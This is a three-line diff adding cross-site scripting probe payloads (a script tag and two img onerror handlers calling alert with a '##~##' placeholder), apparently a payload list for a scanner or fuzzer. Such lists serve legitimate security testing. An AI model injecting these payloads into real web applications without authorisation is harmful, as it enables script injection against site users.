@@ -1,0 +1,3 @@
+<script>alert(##~##);</script>
+<img src=x onerror=alert(##~##)>
+<img src=x onerror=javascript:alert(##~##)>
